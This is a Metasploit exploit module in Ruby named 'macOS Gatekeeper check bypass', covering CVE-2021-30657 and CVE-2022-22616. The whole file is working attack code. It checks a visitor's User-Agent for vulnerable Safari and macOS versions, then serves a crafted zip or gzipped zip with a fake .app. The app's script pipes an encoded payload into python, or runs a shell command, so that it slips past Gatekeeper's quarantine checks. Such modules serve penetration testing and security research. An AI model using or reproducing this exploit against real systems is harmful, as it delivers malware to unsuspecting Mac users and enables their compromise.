##
# This module requires Metasploit: https://metasploit.com/download
# Current source: https://github.com/rapid7/metasploit-framework
##

class MetasploitModule < Msf::Exploit::Remote
  Rank = ManualRanking

  include Msf::Exploit::EXE
  include Msf::Exploit::Remote::HttpServer

  def initialize(info = {})
    super(
      update_info(
        info,
        'Name' => 'macOS Gatekeeper check bypass',
        'Description' => %q{
          This module exploits two CVEs that bypass Gatekeeper.

          For CVE-2021-30657, this module serves an OSX app (as a zip) that contains no
          Info.plist, which bypasses gatekeeper in macOS < 11.3.
          If the user visits the site on Safari, the zip file is automatically extracted,
          and clicking on the downloaded file will automatically launch the payload.
          If the user visits the site in another browser, the user must click once to unzip
          the app, and click again in order to execute the payload.

          For CVE-2022-22616, this module serves a gzip-compressed zip file with its file header pointing
          to the `Contents` directory which contains an OSX app. If the user downloads the file via Safari,
          Safari will automatically decompress the file, removing its `com.apple.quarantine` attribute.
          Because of this, the file will not require quarantining, bypassing Gatekeeper on
          MacOS versions below 12.3.
        },
        'License' => MSF_LICENSE,
        'Targets' => [
          [ 'macOS x64 (Native Payload)', { 'Arch' => ARCH_X64, 'Platform' => [ 'osx' ] } ],
          [ 'Python payload', { 'Arch' => ARCH_PYTHON, 'Platform' => [ 'python' ] } ],
          [ 'Command payload', { 'Arch' => ARCH_CMD, 'Platform' => [ 'unix' ] } ]
        ],
        'DefaultTarget' => 0,
        'DisclosureDate' => '2021-03-25',
        'Author' => [
          'Cedric Owens', # CVE-2021-30657 Discovery
          'timwr', # Module
          'Ferdous Saljooki', # CVE-2022-22616 Discovery (@malwarezoo)
          'Jaron Bradley', # CVE-2022-22616 Discovery (@jbradley89)
          'Mickey Jin', # CVE-2022-22616 Discovery (@patch1t)
          'Shelby Pace' # CVE-2022-22616 Additions
        ],
        'Notes' => {
          'Stability' => [ CRASH_SAFE ],
          'Reliability' => [ REPEATABLE_SESSION ],
          'SideEffects' => [ IOC_IN_LOGS, ARTIFACTS_ON_DISK ]
        },
        'References' => [
          ['CVE', '2021-30657'],
          ['CVE', '2022-22616'],
          ['URL', 'https://cedowens.medium.com/macos-gatekeeper-bypass-2021-edition-5256a2955508'],
          ['URL', 'https://objective-see.com/blog/blog_0x64.html'],
          ['URL', 'https://jhftss.github.io/CVE-2022-22616-Gatekeeper-Bypass/'],
          ['URL', 'https://www.jamf.com/blog/jamf-threat-labs-safari-vuln-gatekeeper-bypass/']
        ]
      )
    )
    register_options([
      OptString.new('APP_NAME', [false, 'The application name (Default: app)', 'app']),
      OptEnum.new('CVE', [true, 'The vulnerability to exploit', 'CVE-2022-22616', ['CVE-2021-30657', 'CVE-2022-22616']])
    ])
  end

  def cve
    datastore['CVE']
  end

  def check_useragent(user_agent)
    safari_version = nil
    if user_agent =~ %r{Version/(\d+\.\d+(\.\d+)*)\sSafari}
      safari_version = Regexp.last_match(1)
    end

    if safari_version && Rex::Version.new(safari_version) < Rex::Version.new('15.4') && cve == 'CVE-2022-22616'
      print_good("Safari version #{safari_version} is vulnerable")
      return true
    end

    return false unless user_agent =~ /Intel Mac OS X (.*?)\)/

    osx_version = Regexp.last_match(1).gsub('_', '.')
    mac_osx_version = Rex::Version.new(osx_version)
    if mac_osx_version >= Rex::Version.new('12.3')
      print_warning "macOS version #{mac_osx_version} is not vulnerable"
    elsif mac_osx_version < Rex::Version.new('10.15.6')
      print_warning "macOS version #{mac_osx_version} is not vulnerable"
    else
      print_good "macOS version #{mac_osx_version} is vulnerable"
      return true
    end

    false
  end

  def on_request_uri(cli, request)
    user_agent = request['User-Agent']
    print_status("Request #{request.uri} from #{user_agent}")
    unless check_useragent(user_agent)
      print_error 'Unexpected User-Agent'
      send_not_found(cli)
      return
    end

    app_name = datastore['APP_NAME'] || Rex::Text.rand_text_alpha(5)

    app_file_name = "#{app_name}.zip"
    zipped = app_zip(app_name)

    if cve == 'CVE-2022-22616'
      zipped = Rex::Text.gzip(zipped)
      app_file_name = "#{app_file_name}.gz"
    end

    send_response(cli, zipped, { 'Content-Type' => 'application/zip', 'Content-Disposition' => "attachment; filename=\"#{app_file_name}\"" })
  end

  def app_zip(app_name)
    case target['Arch']
    when ARCH_X64
      payload_data = Msf::Util::EXE.to_python_reflection(framework, ARCH_X64, payload.encoded, {})
      command = "echo \"#{payload_data}\" | python & disown"
    when ARCH_PYTHON
      command = "echo \"#{payload.encoded}\" | python"
    when ARCH_CMD
      command = payload.encoded
    end

    shell_script = <<~SCRIPT
      #!/bin/sh

      #{command}
    SCRIPT

    zip = Rex::Zip::Archive.new
    zip.add_file("#{app_name}.app/", '') if cve != 'CVE-2022-22616'
    zip.add_file("#{app_name}.app/Contents/", '')
    zip.add_file("#{app_name}.app/Contents/MacOS/", '')
    zip.add_file("#{app_name}.app/Contents/MacOS/#{app_name}", shell_script).last.attrs = 0o777
    zip.pack
  end
end
